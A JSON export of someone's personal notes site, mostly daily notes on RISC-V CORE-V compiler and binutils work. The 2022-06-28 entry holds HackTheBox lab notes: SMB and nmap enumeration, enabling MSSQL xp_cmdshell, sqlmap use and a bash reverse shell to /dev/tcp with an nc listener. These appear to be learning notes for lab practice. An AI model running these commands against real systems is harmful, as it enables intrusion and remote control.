{
  "/": {
    "title": "Morioh",
    "content": "# Welcome :)\n\nMain hub for all the different note categories :)\n\n\u003ccenter\u003e\u003cimg src=\"https://media2.giphy.com/media/TI9HiyUqRm75jPyKQ5/giphy.gif?cid=ecf05e4799x4brmyrv3lgup74b1onq4s89nps3z3lwxmbls2\u0026rid=giphy.gif\u0026ct=g\"\u003e\u003c/center\u003e\n\n## All of my knowledge \n- [Hub](notes/general/knowledge-hub.md)\n\n## Work\n- [Hub](notes/private/work/work-hub.md)\n\n## University\n- [Hub](notes/university/university-hub.md)\n\n## Tasks\n- [Hub](notes/general/task-hub.md)\n",
    "lastmodified": "2022-11-24T12:21:05.367047069Z",
    "tags": null
  },
  "/notes/daily/2020-09-28": {
    "title": "2020-09-28",
    "content": "# 2020-09-28\n---\na5 is t1 and a4 is t0 \n\nit is optimising out add and move\n\nadjust the address to the same mode, and move the des from one the regis, and then (instead of setupi using starti) push no rvc, then copy source to reg0 then back to reg1 then emit the label\n\nit looks like you can't increment a symbol\n\ncontinue to work on addi because it was working before so it should again\n\nfive_bit_sleu_operand is not working, TODO: Can also be a label?\n\nneed to take volatile out!!! in riscv.c:3251\n\nextracted the registers from source and increment it, but it isnt in a loop so why increment? ?\n\nwe are incrementing, we need an instruction to recognise it as a loop. put a dummy line to use it after, today we want to put in a dummy loop and see if it emits it",
    "lastmodified": "2022-11-24T12:20:51.221800685Z",
    "tags": null
  },
  "/notes/daily/2020-10-08": {
    "title": "2020-10-08",
    "content": "# 2020-10-08\n---\nneed mcorev-loops flag\noptmisation needs to be on for it to work\nnothing is on by default\ngen functions -\u003e gen starti etc\nyou can write gen_starti etc, they can be useful\n\nthe official documentation for the tools\n\nfor the gnu assembler -\u003e the doc is in tecinfo like latec but much simpler -\u003e\nmake doc, make pdf, make html -\u003e look at the assembler manual as generated by\nmake pdf -\u003e sourceware.org/binutils/docs/as/index.html make html -\u003e look for\nanything that is target specific -\u003e machine dependent features -\u003e riscv\ndependant features -\u003e modify this sections -\u003e create in gas/doc/ separate files\nfor target specific -\u003e main thing as.texi -\u003e @include c-riscv.texi -\u003e GNU\ntexinfo manual -\u003e need to install texinfo -\u003e the directives are generally @'s,\na lot of this can be done by looking at what others did -\u003e everytime you have\na section it will have an @ node, texinfo takes two outputs info outputs and\nhtml/pdf etc -\u003e need @node and @section -\u003e there is also subsections -\u003e chapter\nis the top level, and inside there you get a menu, it has two halves first\nthing is the node then the subsection -\u003e will need a menu in so the hierarchy\nworks, then a subsection for corev -\u003e or just add after -march add some words\nthat x_corev and x_corevhwl -\u003e make info to make sure it generates any info\nfiles and make html and make pdf\n\nld is ld.texi no doc dir",
    "lastmodified": "2022-11-24T12:20:51.258772612Z",
    "tags": null
  },
  "/notes/daily/2020-10-28": {
    "title": "2020-10-28",
    "content": "# 2020-10-28\n---\ngcc/gcc/config/arc:2201\n\nIt has a gen_mac_600 which is the closest to gen_mac I could find\n\nIn gcc/gcc/config/mips:2563 it has Floating point multiply accumulate instructions but they\nlook very different.\n\n```\n;; SPARClet multiply/accumulate insns\n\n(define_insn \"*smacsi\"\n  [(set (match_operand:SI 0 \"register_operand\" \"=r\")\n        (plus:SI (mult:SI (match_operand:SI 1 \"register_operand\" \"%r\")\n                          (match_operand:SI 2 \"arith_operand\" \"rI\"))\n                 (match_operand:SI 3 \"register_operand\" \"0\")))]\n  \"TARGET_SPARCLET\"\n  \"smac\\t%1, %2, %0\"\n  [(set_attr \"type\" \"imul\")])\n\n(define_insn \"*smacdi\"\n  [(set (match_operand:DI 0 \"register_operand\" \"=r\")\n        (plus:DI (mult:DI (sign_extend:DI\n                           (match_operand:SI 1 \"register_operand\" \"%r\"))\n                          (sign_extend:DI\n                           (match_operand:SI 2 \"register_operand\" \"r\")))\n                 (match_operand:DI 3 \"register_operand\" \"0\")))]\n  \"TARGET_SPARCLET\"\n  \"smacd\\t%1, %2, %L0\"\n  [(set_attr \"type\" \"imul\")])\n\n(define_insn \"*umacdi\"\n  [(set (match_operand:DI 0 \"register_operand\" \"=r\")\n        (plus:DI (mult:DI (zero_extend:DI\n                           (match_operand:SI 1 \"register_operand\" \"%r\"))\n                          (zero_extend:DI\n                           (match_operand:SI 2 \"register_operand\" \"r\")))\n                 (match_operand:DI 3 \"register_operand\" \"0\")))]\n  \"TARGET_SPARCLET\"\n  \"umacd\\t%1, %2, %L0\"\n  [(set_attr \"type\" \"imul\")])\n```\n\n---\n\nIn pulp, they have bultins for MAC in gcc/config/riscv/pulp_builtins.def which\nis:\n```\nDIRECT_BUILTIN1(maddsisi4,        \tmac,        \tRISCV_INT_FTYPE_INT_INT_INT,     \t\tpulp_vall, NULL)\n  DIRECT_BUILTIN1(msubsisi4,        \tmsu,        \tRISCV_INT_FTYPE_INT_INT_INT,     \t\tpulp_vall, NULL)\n\n  DIRECT_BUILTIN1(macshi_si4,         \tmacs,       \tRISCV_INT_FTYPE_SHORT_SHORT_INT, \t\tpulp_vall, NULL)\n  DIRECT_BUILTIN1(macuhi_si4,         \tmacu,       \tRISCV_INT_FTYPE_SHORT_SHORT_INT, \t\tpulp_vall, NULL)\n\n  DIRECT_BUILTIN1(machlsu_si4,      \tmachlsu,    \tRISCV_INT_FTYPE_INT_SHORT_INT,   \t\tpulp_v0_only, NULL)\n  DIRECT_BUILTIN1(machlu_si4,       \tmachlu,     \tRISCV_INT_FTYPE_INT_SHORT_INT,   \t\tpulp_v0_only, NULL)\n\n  DIRECT_BUILTIN1(machhs_si4,       \tmachhs,     \tRISCV_INT_FTYPE_INT_INT_INT,     \t\tpulp_vall, NULL)\n  DIRECT_BUILTIN1(machhu_si4,       \tmachhu,     \tRISCV_INT_FTYPE_INT_INT_INT,     \t\tpulp_vall, NULL)\n\n  DIRECT_BUILTIN1(machls_si4,       \tmachls,     \tRISCV_INT_FTYPE_INT_SHORT_INT,   \t\tpulp_v0_only, NULL)\n```\n\nthen:\n\n```\n DIRECT_BUILTIN1(macsNr_si3,\t\tmacsN,\t\tRISCV_INT_FTYPE_SHORT_SHORT_INT_INT,\t\tpulp_v2, CheckBuiltin)\n  DIRECT_BUILTIN1(macuNr_si3,\t\tmacuN,\t\tRISCV_INT_FTYPE_SHORT_SHORT_INT_INT,\t\tpulp_v2, CheckBuiltin)\n  DIRECT_BUILTIN1(macsRNr_si3,\t\tmacsRN,\t\tRISCV_INT_FTYPE_SHORT_SHORT_INT_INT_INT,\tpulp_v2, CheckBuiltin)\n  DIRECT_BUILTIN1(macuRNr_si3,\t\tmacuRN,\t\tRISCV_INT_FTYPE_SHORT_SHORT_INT_INT_INT,\tpulp_v2, CheckBuiltin)\n  DIRECT_BUILTIN1(machhsNr_si3,\t\tmachhsN,\tRISCV_INT_FTYPE_SHORT_SHORT_INT_INT,\t\tpulp_v2, CheckBuiltin)\n  DIRECT_BUILTIN1(machhuNr_si3,\t\tmachhuN,\tRISCV_INT_FTYPE_SHORT_SHORT_INT_INT,\t\tpulp_v2, CheckBuiltin)\n  DIRECT_BUILTIN1(machhsRNr_si3,\tmachhsRN,\tRISCV_INT_FTYPE_SHORT_SHORT_INT_INT_INT,\tpulp_v2, CheckBuiltin)\n  DIRECT_BUILTIN1(machhuRNr_si3,\tmachhuRN,\tRISCV_INT_FTYPE_SHORT_SHORT_INT_INT_INT,\tpulp_v2, CheckBuiltin)\n\n  DIRECT_BUILTIN1(macsForced_si3,       macfs,       \tRISCV_INT_FTYPE_INT_INT_INT,    \t\tpulp_v2, NULL)\n  DIRECT_BUILTIN1(macuForced_si3,       macfu,       \tRISCV_INT_FTYPE_INT_INT_INT,    \t\tpulp_v2, NULL)\n  DIRECT_BUILTIN1(macsForcedNr_si3,     macfsN,       \tRISCV_INT_FTYPE_INT_INT_INT_INT,    \t\tpulp_v2, CheckBuiltin)\n  DIRECT_BUILTIN1(macuForcedNr_si3,     macfuN,       \tRISCV_INT_FTYPE_INT_INT_INT_INT,    \t\tpulp_v2, CheckBuiltin)\n  DIRECT_BUILTIN1(macsForcedRNr_si3,    macfsRN,       \tRISCV_INT_FTYPE_INT_INT_INT_INT_INT,   \t\tpulp_v2, CheckBuiltin)\n  DIRECT_BUILTIN1(macuForcedRNr_si3,    macfuRN,       \tRISCV_INT_FTYPE_INT_INT_INT_INT_INT,   \t\tpulp_v2, CheckBuiltin)\n```\n\n---\n\nthen in `gcc/config/riscv/riscv-builtins.c` they have the definition of\nCheckBuiltin:262 then line 331\n\n---\nIn PULP gcc/config/riscv/riscv.md:1661\n\n```\n;;      PARTIAL MAC (16x16 into 32)\n;;\n;;  ....................\n\n(define_insn \"macs\u003cmode\u003e_si4\"\n  [(set (match_operand:SI 0 \"register_operand\" \"=a,r\")\n        (plus:SI (mult:SI (sign_extend:SI (match_operand:SHORT 1 \"register_operand\" \"r,r\"))\n                          (sign_extend:SI (match_operand:SHORT 2 \"register_operand\" \"r,r\"))\n                 )\n                 (match_operand:SI 3 \"register_operand\" \"r,0\")\n        )\n   )\n  ]\n  \"((Pulp_Cpu\u003e=PULP_V0) \u0026\u0026 !TARGET_MASK_NOPARTMAC)\"\n  \"@\n   p.macs \\t%0,%1,%2,%3\n   p.macs \\t%0,%1,%2\"\n  [(set_attr \"type\" \"imul,imul\")\n   (set_attr \"mode\" \"SI\")]\n)\n\n(define_insn \"macu\u003cmode\u003e_si4\"\n  [(set (match_operand:SI 0 \"register_operand\" \"=a,r\")\n        (plus:SI (mult:SI (zero_extend:SI (match_operand:SHORT 1 \"register_operand\" \"r,r\"))\n                          (zero_extend:SI (match_operand:SHORT 2 \"register_operand\" \"r,r\"))\n                 )\n                 (match_operand:SI 3 \"register_operand\" \"r,0\")\n        )\n   )\n  ]\n  \"((Pulp_Cpu\u003e=PULP_V0) \u0026\u0026 !TARGET_MASK_NOPARTMAC)\"\n  \"@\n   p.macu \\t%0,%1,%2,%3\n   p.macu \\t%0,%1,%2\"\n  [(set_attr \"type\" \"imul,imul\")\n   (set_attr \"mode\" \"SI\")]\n)\n\n\n;; Pure builtins macs/macu, purpose is to use plain int arguments without casting to short int\n(define_insn \"macsForced_si3\"\n  [(set (match_operand:SI 0 \"register_operand\" \"=r,r\")\n        (unspec: SI [(match_operand:SI 1 \"register_operand\" \"r,r\") (match_operand:SI 2 \"register_operand\" \"r,r\") (match_operand:SI 3 \"register_operand\" \"r,0\")] UNSPEC_MACS)\n   )\n  ]\n  \"((Pulp_Cpu\u003e=PULP_V0) \u0026\u0026 !TARGET_MASK_NOMAC)\"\n  \"@\n   p.macs \\t%0,%1,%2,%3\n   p.macs \\t%0,%1,%2\"\n  [(set_attr \"type\" \"imul,imul\")\n   (set_attr \"mode\" \"SI\")]\n)\n```",
    "lastmodified": "2022-11-24T12:20:51.292376518Z",
    "tags": null
  },
  "/notes/daily/2020-11-18-tiger-meeting": {
    "title": "Tiger - Sync-up",
    "content": "# Tiger - Synch-up\n---\nPaolo been working on testing. He has TIGER/toolchain/gcc-test-scan, inside he has folders with errors for practicality. First take the directories from Jenkins and run the script. The message shows where in the compiler the error is happening. Can run 'make show' shows how many error are in each category, prioritise the ones occur the most.\n\nKeep digging for more messages and fix errors.\n\nSome tests give us error messages because of the whole using LLVM and GCC, ending up in conflicting error messages.\n\n* First step is to fetch the latest GCC.log and download\n* Look at the file\n* Download and run Paolo's script to replicate\n* Add more cases to better filter out\n\nAfter that send Paolo messages!!\n\nIf you start working on a bug put it as an Issue on Git.",
    "lastmodified": "2022-11-24T12:20:51.326472878Z",
    "tags": null
  },
  "/notes/daily/2020-11-19": {
    "title": "2020-11-19",
    "content": "# 2020-11-19\n---\n`p.extbz rD, rs1`\n\n```\n(define_insn \"cv_extbz\"\n  [(set (match_operand:SI 0 \"register_operand\" \"=r\")\n    (zero_extend:SI (match_operand:HI 1 \"register_operand\" \"r\"))\n  )]\n  \"TARGET_COREV_ALU\"\n  \"cv.extbz\\t%0,%1\"\n  [(set_attr \"type\" \"imul\")\n   (set_attr \"mode\" \"SI\")]\n)\n```\n\ngit log for the p.clipr change from 010 to 101!\n\nmodified adduRN to add the NOTE\n\nadded empty rows as so line doesn't wrap when document gets produced \n\nsee if Hugh has a good example program you can use\n\nmake sure to get the doc for everyone to review!!\n\nwe might be advised to put the COREV project on hold\n\nfind bugs in binutils gdb or gcc and try to fix them -\u003e fixing upstream bugs\n\ncode speed task group have a list of 6 issues to be resolved in GCC -\u003e might be hard\n\n`if rs1 \u003c= -2^(Is2-1), rD = -2^(Is2-1), else if rs1 \u003e= 2^(Is2-1)–1, rD = 2^(Is2-1)-1, else rD = rs1`\n\n```\n(define_insn \"cv_clip\"\n    [(set (match_operand:SI 0 \"register_operand\" \"=r\")\n        (if_then_else:SI\n            (le:SI (match_operand:SI 1 \"register_operand\" \"r\")\n                   (match_operand:SI 2 \"register_operand\" \"r\"))\n                (const_int 1)\n            (const_int 0)\n        )\n  )]\n  \"TARGET_COREV_MAC\"\n  \"cv.slet\\t%0,%1,%2\"\n  [(set_attr \"type\" \"imul\")\n   (set_attr \"mode\" \"SI\")]\n)\n```",
    "lastmodified": "2022-11-24T12:20:51.358566046Z",
    "tags": null
  },
  "/notes/daily/2021-04-06-tiger-jenkins-guide": {
    "title": "2021-04-06 - Tiger Jenkins Guide",
    "content": "# 2021-04-06 - Tiger Jenkins Guide\n---\ngo to main wiki\n\njenkins\n\ntiger-user-branches\n\ngo to build with parameters\n\nchoose my branch\n\nriscv32-clang-gcc-testing\n\nimc ilp 32\n\nbootstrap-sources -\u003e clones all sources\n\nwe might end up with slightly different test numbers\n\ntaken patches we had and rebased them from where we had in the old GCC gittree to the new one, based on proper git GCC tree\n\nfork the repo and add new remote and open PR agaisnt it (all-fixes-rebase)\n\nso you need to fork this: https://git.embecosm.com/simon/riscv32-clang-gcc-testing\n\nthen run the file `bootstrap-sources.sh` which will clone all the other repos for you\n\nrun `build-riscv32-clang.sh` (you might need to specify a newer version of CMake)\n\nthen run `run-tests.py`\n\nturning failures into unsupported\n\nfrom 0 to 117 then to 277 then last 15\n\n```\n/* { dg-require-effective-target gcc_frontend } */\n\ngcc.c-torture/compile/pr25224.c funswitch-loops\ngcc.dg/loop-unswitch-4.c funswitch-loops\npr92115.c funswitch-loops\npr92591-1.c -fno-dce -fno-sched-pressure -fmodulo-sched -fweb -fno-ivopts\n\n57 Executing on host: riscv32-unknown-elf-clang /home/pietraferreira/riscv32-clang-gcc-testing/gcc-for-llvm-testing/gcc/testsuite/gcc.dg/pr92591-1.c  -march=rv32imc -mabi=ilp32     -O2 -fmodulo-sched -fweb -fno    -dce -fno-ivopts -fno-sched-pressure -fno-tree-loop-distribute-patterns --param sms-dfa-history=1 -S   -o pr92591-1.s    (timeout = 300)\n58 spawn -ignore SIGHUP riscv32-unknown-elf-clang /home/pietraferreira/riscv32-clang-gcc-testing/gcc-for-llvm-testing/gcc/testsuite/gcc.dg/pr92591-1.c -march=rv32imc -mabi=ilp32 -O2 -fmodulo-sched -fweb -fno-dc    e -fno-ivopts -fno-sched-pressure -fno-tree-loop-distribute-patterns --param sms-dfa-history=1 -S -o pr92591-1.s\n59 clang-13: ^[[0;1;31merror: ^[[0m^[[1munknown argument: '-fno-dce'^[[0m\n60 clang-13: ^[[0;1;31merror: ^[[0m^[[1munknown argument: '-fno-sched-pressure'^[[0m\n61 clang-13: ^[[0;1;31merror: ^[[0m^[[1munknown argument: '-fno-tree-loop-distribute-patterns'^[[0m\n62 clang-13: ^[[0;1;35mwarning: ^[[0m^[[1moptimization flag '-fmodulo-sched' is not supported [-Wignored-optimization-argument]^[[0m\n63 clang-13: ^[[0;1;35mwarning: ^[[0m^[[1moptimization flag '-fweb' is not supported [-Wignored-optimization-argument]^[[0m\n64 clang-13: ^[[0;1;35mwarning: ^[[0m^[[1moptimization flag '-fno-ivopts' is not supported [-Wignored-optimization-argument]^[[0m\n65 compiler exited with status 1\n66 FAIL: gcc.dg/pr92591-1.c (test for excess errors)\n\ngcc summary:\n\n# of expected passes\t\t32938\n# of unexpected failures\t6964\n# of unexpected successes\t10\n# of expected failures\t\t222\n# of unresolved testcases\t1898\n# of unsupported tests\t\t6278\n\nhere area couple of regression failures that you might \"like\":\ntest gcc.c-torture/execute/960416-1.c:\n\nclang-11: /home/jenkins/workspace/tiger/llvm-project/llvm/lib/CodeGen/SelectionDAG/LegalizeIntegerTypes.cpp:1438: bool llvm::DAGTypeLegalizer::PromoteIntegerOperand(llvm::SDNode*, unsigned int): Assertion `Res.getValueType() == N-\u003egetValueType(0) \u0026\u0026 N-\u003egetNumValues() == (IsStrictFp ? 2 : 1) \u0026\u0026 \"Invalid operand expansion\"' failed.\n\n/* { dg-require-effective-target gcc_frontend } */\n/* { dg-require-effective-target builtin_setjmp_longjmp } */\n/* { dg-require-effective-target not_llvm } */\n```",
    "lastmodified": "2022-11-24T12:20:51.380187511Z",
    "tags": null
  },
  "/notes/daily/2021-04-23-how-to-use-creduce-by-ed": {
    "title": "How to Use Creduce by Ed",
    "content": "# How to Use Creduce by Ed\n---\nAs for steps on how to use Creduce:\n\nTake a copy of the failing test in a temporary directory:\n\n```bash\nmkdir -p \u003ctemporary_dir\u003e\ncp \u003cfailing_test.c\u003e \u003ctemporary_dir\u003e\nvim \u003ctemporary_dir\u003e/reduce.sh\n```\n\nCreate a script `reduce.sh`. This contain the command which builds your failing test and triggers the crash. If it crashes then it should return 0, otherwise it should return non-zero:\n\n```\n#!/usr/bin/env bash\nbsc-elf-clang \u003coptions_to_trigger_failure\u003e failing_test.c 2\u003e\u00261 | grep 'Node emitted out of order'\n```\n\nIn the above, grep will return 0 if it matches the 'Node emitted out of order' on stderr.\n\nThen to actually use Creduce:\n\n```\ncd \u003ctemporary_dir\u003e\ncreduce ./reduce.sh failing_test.c\n\n```\n\nCreduce will repeatedly run ./reduce.sh, then it will continually remove bits from failing_test.c until it comes up with a minimal .c file which reproduces the error .",
    "lastmodified": "2022-11-24T12:20:51.39564836Z",
    "tags": null
  },
  "/notes/daily/2022-05-03-relocation-prototype-meeting": {
    "title": "2022-05-03 - Relocation Prototype Meeting",
    "content": "# Monthly (or quaterly?) meeting - Relocation Prototype\n\n```c\n../../../binutils-gdb/bfd/elfxx-riscv.c:1046:1: warning: no previous prototype for ‘riscv_reloc_name_lookup_custom’ [-Wmissing-prototypes]\n riscv_reloc_name_lookup_custom (bfd *abfd ATTRIBUTE_UNUSED, const char *r_name)\n ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n```\n\n* Have secondary howto table with `RELOCID` \n* `special_function` is what triggers `perform_relocation` -\u003e prototype a function for COREV\n* Make sure to set the flag which looks for `howto_table` back to 0\n\n* `bfd_elf_generic_reloc` is in `bfd/elf.c`\n\n* Look into `riscv_elf_add_sub_reloc`, we'll try to replicate it but for `RELOCID`\n`howto` in `riscv_elf_add_sub_reloc` is basically just a pointer for the other function (i think `perform_relocation`)",
    "lastmodified": "2022-11-24T12:20:51.413987637Z",
    "tags": null
  },
  "/notes/daily/2022-06-02": {
    "title": "2022-06-02",
    "content": "# 2022-06-02\n---\nAssuming we already have `RELOCID` in place:\n\nThere is a `bool pretend_im_corev` in `gas/config/tc-riscv.c` which sets the [relocation](notes/general/relocations.md) as CORE-V. Then it gets checked and we set an **ID** for CORE-V (100):\n\n```c\nif (pretend_im_corevid \u0026\u0026 fixP-\u003efx_tcbit \u0026\u0026 fixP-\u003efx_addsy != NULL)\n{\nfixP-\u003efx_next = xmemdup (fixP, sizeof (*fixP), sizeof (*fixP));\nfixP-\u003efx_next-\u003efx_addsy = fixP-\u003efx_next-\u003efx_subsy = NULL;\n// CUSTOM RELOC\nfixP-\u003efx_next-\u003efx_r_type = BFD_RELOC_RISCV_RELOCID;\nfixP-\u003efx_next-\u003efx_size = 0;\n// ID\nfixP-\u003efx_next-\u003efx_offset = 100;\n}\n```\n\nWe then have a secondary howto table where the `special_function` is `riscv_elf_custom_relocid`, which should trigger `perform_relocation`. This function should handle the [relocation](notes/general/relocations.md) as you can see:\n\n```c\nstatic bfd_reloc_status_type\nriscv_elf_custom_relocid (bfd *abfd,\n       arelent *reloc_entry,\n       asymbol *symbol,\n       void *data,\n       asection *input_section,\n       bfd *output_bfd,\n       char **error_message ATTRIBUTE_UNUSED)\n       // do i need this?\n       //bfd_vma value)\n{\n  reloc_howto_type *howto = reloc_entry-\u003ehowto;\n  bfd_vma relocation;\n\n  if (output_bfd != NULL\n      \u0026\u0026 (symbol-\u003eflags \u0026 BSF_SECTION_SYM) == 0\n      \u0026\u0026 (!reloc_entry-\u003ehowto-\u003epartial_inplace || reloc_entry-\u003eaddend == 0))\n    {\n      reloc_entry-\u003eaddress += input_section-\u003eoutput_offset;\n            return bfd_reloc_ok;\n    }\n\n  if (output_bfd != NULL)\n    return bfd_reloc_continue;\n\n  relocation = symbol-\u003evalue + symbol-\u003esection-\u003eoutput_section-\u003evma\n    + symbol-\u003esection-\u003eoutput_offset + reloc_entry-\u003eaddend;\n  bfd_vma old_value = bfd_get (howto-\u003ebitsize, abfd,\n             data + reloc_entry-\u003eaddress);\n\n  switch (howto-\u003etype)\n    {\n    case R_RISCV_CVPCREL_UI12:\n      symbol-\u003evalue = ENCODE_CV_HWLP_UIMM5(symbol-\u003evalue \u003e\u003e howto-\u003erightshift);\n      break;\n    }\n  bfd_put (howto-\u003ebitsize, abfd, relocation, data + reloc_entry-\u003eaddress);\n\n  return bfd_reloc_ok;\n}\n```\n\nFinally in `bfd/elfnn-riscv.c` we have:\n\n```c\n/* Relocation handling prototype */\n    case R_RISCV_RELOCID:\n      switch (value) {\n        case 100:\n        //    ;\n          return riscv_elf_custom_relocid(ELFNN_R_TYPE (rel-\u003er_info));\n        //return get_howto_from_table(\u0026SECONDARYhowto_table, rel);\n        //return bfd_reloc_ok;\n        }\n        break;\n```\n\nWhich should link everything together, meaning it checks the ID in `R_RISCV_RELOCID` and calls the `perform_relocation` function, in our case `riscv_elf_custom_relocid`. This is the part where I am struggling :(\n\nThe error I am getting is:\n\n```bash\nnrun.o libsim.a ../../bfd/libbfd.a ../../opcodes/libopcodes.a  ../../libiberty/libiberty.a -lm -ldl -lnsl  -L../../zlib -lz   ../../gnulib/import/libgnu.a\n../../bfd/libbfd.a(elf32-riscv.o): In function `perform_relocation':\n/home/pietraferreira/corev/build/binutils-gdb/bfd/elfnn-riscv.c:1653: undefined reference to `riscv_elf_custom_relocid'\n../../bfd/libbfd.a(elf64-riscv.o): In function `perform_relocation':\n/home/pietraferreira/corev/build/binutils-gdb/bfd/elfnn-riscv.c:1653: undefined reference to `riscv_elf_custom_relocid'\ncollect2: error: ld returned 1 exit status\n```",
    "lastmodified": "2022-11-24T12:20:51.525681615Z",
    "tags": null
  },
  "/notes/daily/2022-06-17-jeremy-relocation-notes": {
    "title": "2022-06-17 - Jeremy Relocation Notes",
    "content": "# 2022-06-17\n---\nend of linker -\u003e introduce the issue of being no mechanism for vendor specific relocation -\u003e discuss issue of relocations, we can do vendor specific but not vendor specific relocations. it boisl that we have the relocs for everyone in the linker, and gcc we have target specific\n\nput more in 4th slide -\u003e talk about corev vendor specific field -\u003e we need to put in there second slide -\u003e vendor specific GNU tools -\u003e we can say this is how we do vendor specific target, later on we are going to talk about when it wont work properly\n\nwe add to linker assembly, we put in insn builtins, and code generation then optimisation \u003c- talk about 4 stages \u003c- we will apply the first 3 for each of those, the optimisation for the future\n\nshow stage1",
    "lastmodified": "2022-11-24T12:20:51.820227861Z",
    "tags": null
  },
  "/notes/daily/2022-06-23": {
    "title": "2022-06-23",
    "content": "# 2022-06-23\n---\nI think I am getting this error:\n\n```bash\n../bfd/.libs/libbfd.a(elf32-riscv.o): In function `perform_relocation':\n/home/pietraferreira/corev/build/binutils-gdb/bfd/elfnn-riscv.c:1653: undefined reference to `riscv_elf_custom_relocid'\n```\n\nBecause `riscv_elf_custom_relocid` is being called from **inside** `perform_relocation`, thus it doesn't exist in that space. \n\nAlso, `riscv_elf_custom_relocid` is a **status type**, thus defines the status function in the howto table.",
    "lastmodified": "2022-11-24T12:20:52.159322262Z",
    "tags": null
  },
  "/notes/daily/2022-06-27-benefits-of-vms": {
    "title": "2022-06-27",
    "content": "# 2022-06-27\n---\n## React Game of Life ([Here](https://www.freecodecamp.org/news/create-gameoflife-with-react-in-one-hour-8e686a410174))\n\n`npm init react-app react-gameoflife`\n\n## HackTheBox\n### Setting Up\n- Can track commands on the terminal by doing:\n\n```bash\nscript \u003cname\u003e.log\n...COMMANDS...\nexit\n```\n\n- Output redirection:\n\n```bash\n./custom-tool.py 10.129.28.119 \u003e logs.custom-tool\n```\n\n```bash\n./custom-tool.py 10.129.28.119 | tee -a logs.custom-tool\n```\n\n#### Benefits of VM's\n1. Applications and services of a VM do not interfere with each other.\n2. Complete independence of the guest system from the host system's operating system and the underlying physical hardware.\n3. VMs can be moved or cloned to other systems by simple copying.\n4. Hardware resources can be dynamically allocated via the hypervisor.\n5. Better and more efficient utilisation of existing hardware resources.\n6. Shorter provisioning times for systems and applications.\n7. Simplified management of virtual systems.\n8. Higher availability of VMs due to independence from physical resources.\n\n| Virtual Machine                                                    | Container                                                                                              |\n| ------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------ |\n| Contain applications and the complete operating system             | Contain applications and only the necessary operating system components such as libraries and binaries |\n| A hypervisor such as VMware ESXi provides virtualisation           | The operating system with the container engine provides its own virtualisation                         |\n| Multiple VMs run in isolation from each other on a physical server | Several containers run isolated from each other on one operating system                                |\n",
    "lastmodified": "2022-11-24T12:20:51.865439057Z",
    "tags": null
  },
  "/notes/daily/2022-06-28": {
    "title": "2022-06-28",
    "content": "# 2022-06-28\n---\n## Resources\n- [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb)\n\n## Tools\n### SMB\nServer Message Blocks (Port 445) (aka Common Internet File System).\n\nTo enumerate:\n```bash\nsmbclient -N -L \\\\\\\\{TARGET_IP}\\\\\n\n-N: no password\n-L: look at what services are available\n```\n\nTo access:\n```bash\nsmbclient -N \\\\\\\\{TARGET_IP}\\\\\u003cfolder\u003e\n```\n\nWhen inside, **dir** prints the directories.\n\nTo download a file: **get**.\n\n### NMAP\n```bash\nnmap -p- --min-rate 5000 -sV {TARGET_IP} \nnmap -sC -sV {TARGET_IP}\n```\n\n### Impacket\nCan be used to connect and authenticate to a MSSQL server for example.\n\nWe can try to connect to the MSSQL server by using impacket's `mssqlclient.py` script along with the  \nfollowing flags:  \n```bash\npython3 mssqlclient.py ARCHETYPE/sql_svc@{TARGET_IP} -windows-auth\n\n-windows-auth : this flag is specified to use Windows Authentication  \n```\n\nCheck if I am admin inside MSSQL:\n```sql\nSELECT is_srvrolemember('sysadmin');\n```\n\nTo check for `xp_cmdshell`:\n```sql\nEXEC xp_cmdshell 'net user';\n```\n\nTo activate `xp_cmdshell`:\n```sql\nEXEC sp_configure 'show advanced options', 1;  \nRECONFIGURE;  \nsp_configure; - Enabling the sp_configure as stated in the above error message  \nEXEC sp_configure 'xp_cmdshell', 1;  \nRECONFIGURE;\n```\n\nWe can also use the powershell like this:\n```bash\nxp_cmdshell \"powershell -c pwd\"\n```\n\nNavigation:\n```bash\nxp_cmdshell \"powershell -c cd C:/Users/Public; dir\"\n```\n\nMore on MSSQL Pentesting:\n- Pentesting MSSQL ([HackTricks](https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server))\n- [MSSQL Injection CheatSheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)\n\n### BURP\nBurp Suite is a powerful security testing application that can be used to perform web requests on web applications, mobile apps, and thick clients. Burp offers multiple capabilities such as web crawler, scanner, proxy, repeater, intruder and many more.  \n\nA web crawler (also known as a web spider or web robot) is a program or automated script which browses the World Wide Web in a methodical, automated manner. This process  \nis called Web crawling or spidering. Many legitimate sites, in particular search engines, use spidering as a means of providing up-to-date data.  \n\nIf you tunnel web traffic through Burp Suite (without intercepting the packets), by default it can passively spider the website, update the site map with all of the contents requested and thus creating a tree of files and directories without sending any further requests.\n\n### Stable Reverse Shell\n```bash\nsudo python3 -m http.server 80\n```\n\n```bash\nsudo nc -lvnp 443\n```\n\n- Functional php reverse shell:\n```bash\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n```\n\n### SUID\nCommonly noted as SUID (Set owner User ID), the special permission for the user access level has a single function: A file with SUID always executes as the user who owns the file, regardless of the user passing the command. If the file owner doesn't have execute permissions, then use an uppercase S here.\n\n### Useful Commands\n```bash\ncat * | grep -i passw*\n```\n\n### Crack a ZIP file\nTurn into hash:\n```bash\nzip2john backup.zip \u003e hashes\n```\n\n```bash\njohn -wordlist=/usr/share/wordlists/rockyou.txt hashes\n```\n\n### SQLmap\nSQLmap is an open-source tool used in penetration testing to detect and exploit SQL injection flaws. SQLmap automates the process of detecting and exploiting SQL injection. SQL Injection attacks can take control of databases that utilise SQL.\n\n- Command:\n```bash\nsqlmap -u 'http://10.129.95.174/dashboard.php?search=any+query' --  \ncookie=\"PHPSESSID=7u6p9qbhb44c5c1rsefp4ro8u1\"\n```\n\n- Good shell:\n```bash\nbash -c \"bash -i \u003e\u0026 /dev/tcp/{your_IP}/443 0\u003e\u00261\"\n```",
    "lastmodified": "2022-11-24T12:20:51.940186739Z",
    "tags": null
  },
  "/notes/daily/2022-06-29": {
    "title": "2022-06-29",
